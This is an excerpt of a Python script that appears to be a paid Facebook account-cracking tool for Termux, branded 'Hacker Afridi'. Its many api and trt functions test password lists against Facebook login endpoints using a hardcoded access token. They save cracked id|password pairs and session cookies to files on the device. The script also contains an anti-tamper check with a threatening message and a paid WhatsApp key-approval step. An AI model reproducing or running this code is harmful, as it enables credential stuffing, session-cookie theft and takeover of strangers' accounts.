...
\033[1;37m--------------------------------------------------
[~] Author   : Hacker Afridi
[~] Facebook : Dr Noor AfriDi
[~] Tool     : Paid
[~] Version  : 30.0
\033[1;37m----------------------------------------------""")
def linex():
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				...
				os.system('xdg-open https://chat.whatsapp.com/GRCLEUOREdd1SKk')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [HACKER-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/HACKER-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AFRIDI-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/AFRIDI-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/AFRIDI-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [HACKER-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/HACKER-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HACKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AFRIDI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HACKER-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/HACKER-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/HACKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HACKER-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HACKER-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AFRIDI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [AFRIDI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AFRIDI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HACKER-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AFRIDI-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [HACKER-OK] %s | %s'%(ids,pas))
				open('/sdcard/HACKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [HACKER-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AFRIDI-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AFRIDI-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [AFRIDI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HACKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [AFRIDI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AFRIDI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [HACKER-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/TRT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [AFRIDI-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/AFRIDI-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [HACKER-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HACKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AFRIDI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
def trt6(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [HACKER-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [AFRIDI-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [HACKER-OK] '+uid+' | '+pas)
						#cek_apk(session,coki)
						open('/sdcard/HACKER-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [AFRIDI-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/AFRIDI-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
...
if not str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines()))=='1034':
	time.sleep(0);print('Final Warning If You Try Again Your System Will be Fucked Bye Mr AFRIDI');exit()
try:
	import pyrebase
except:
	if not os.path.exists('.n'):
		print('\033[1;91m[\033[1;97m!\033[1;91m] \033[1;97mInstalling Module Pyrebase')
		os.system('pip install git+https://github.com/NOOR-AFRIDI/Doctor1/blob/main/Approval.txt')
		exit()
def approval():
  os.system('clear')
  print(logo)
 ...
 #     print(" Other Countries : 15$ For Monthly")
    #  print('\033[1;37m----------------------------------------------')
 #     print(" Easypaisa  Number     : +923209083512")
  #    print(" Trust Wallet Address : 007 ")
      input('\033[1;37m Press Enter For Contact To Admin ')
      tks = ('Hello%20MR-AFRIDI%20Sir%20!%20Please%20Approve%20My%20Key%20The%20TRT%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923309580245?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()
